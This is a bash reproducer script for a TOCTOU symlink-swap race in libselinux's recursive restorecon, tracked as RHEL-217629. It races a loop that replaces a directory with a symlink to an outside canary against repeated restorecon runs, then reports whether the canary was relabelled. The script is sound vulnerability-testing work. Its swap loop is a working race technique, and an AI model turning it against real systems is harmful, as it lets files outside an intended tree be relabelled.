#!/bin/bash
#
# Reproducer for RHEL-217629: TOCTOU vulnerability in libselinux recursive
# restorecon allows relabeling of files outside the intended directory tree
# via symlink swapping.
#
# Races a background thread that repeatedly replaces a directory component
# ($WORKDIR/A/B) inside a tree being relabeled with a symlink pointing at a
# canary directory *outside* the tree, against a foreground loop that runs
# `restorecon -R` on the tree. If restorecon ever relabels the canary file
# through the raced symlink, the context of the canary file changes and the
# TOCTOU is confirmed.
#
# Must be run as root on an SELinux-enabled system. Only touches files under
# a private, randomly-named directory in /var/tmp.
set -u

ITER=${ITER:-500}

WORKDIR=$(mktemp -d /var/tmp/toctou_test.XXXXXX)
CANARY=$(mktemp -d /var/tmp/toctou_canary.XXXXXX)
SWAP_PID=""

cleanup() {
	[ -n "$SWAP_PID" ] && kill "$SWAP_PID" 2>/dev/null
	[ -n "$SWAP_PID" ] && wait "$SWAP_PID" 2>/dev/null
	rm -f "$WORKDIR/A/B" 2>/dev/null
	rm -rf "$WORKDIR" "$CANARY"
}
trap cleanup EXIT

# Canary file lives outside the tree passed to restorecon. If it ever gets
# relabeled, restorecon reached it through the raced symlink swap.
echo canary > "$CANARY/canary_file"
chcon -t httpd_sys_content_t "$CANARY/canary_file" >/dev/null 2>&1
ORIG_CTX=$(stat -c %C "$CANARY/canary_file")

# Tree to be relabeled. Deliberately mislabel it so restorecon always has
# something to fix on every path component during each iteration.
mkdir -p "$WORKDIR/A/B"
echo data > "$WORKDIR/A/B/file"
chcon -R -t httpd_sys_content_t "$WORKDIR" >/dev/null 2>&1

# Background swapper: replace $WORKDIR/A/B with a symlink to $CANARY and
# then restore it, in a tight loop, racing restorecon's tree walk.
(
	while true; do
		mv "$WORKDIR/A/B" "$WORKDIR/A/B.bak" 2>/dev/null
		ln -s "$CANARY" "$WORKDIR/A/B" 2>/dev/null
		rm -f "$WORKDIR/A/B" 2>/dev/null
		mv "$WORKDIR/A/B.bak" "$WORKDIR/A/B" 2>/dev/null
	done
) &
SWAP_PID=$!

for i in $(seq 1 "$ITER"); do
	# Re-mislabel before every pass so restorecon always has a real
	# label change (a set, not just a get) to perform on every node,
	# keeping the TOCTOU window open on every iteration instead of only
	# the first one. -h avoids dereferencing symlinks so this never
	# touches the canary directory's contents even if B is currently
	# swapped to point at it.
	chcon -h -R -t httpd_sys_content_t "$WORKDIR" >/dev/null 2>&1
	restorecon -R "$WORKDIR" >/dev/null 2>&1
done

kill "$SWAP_PID" 2>/dev/null
wait "$SWAP_PID" 2>/dev/null
SWAP_PID=""

# Leave the tree in a sane state before checking the result.
rm -f "$WORKDIR/A/B" 2>/dev/null
[ -d "$WORKDIR/A/B.bak" ] && mv "$WORKDIR/A/B.bak" "$WORKDIR/A/B"

NEW_CTX=$(stat -c %C "$CANARY/canary_file")

echo "canary context before: $ORIG_CTX"
echo "canary context after:  $NEW_CTX"

if [ "$ORIG_CTX" != "$NEW_CTX" ]; then
	echo "VULNERABLE: canary file outside the relabeled tree was modified (RHEL-217629)"
	exit 1
else
	echo "NOT VULNERABLE: canary file context unchanged (RHEL-217629 fixed)"
	exit 0
fi
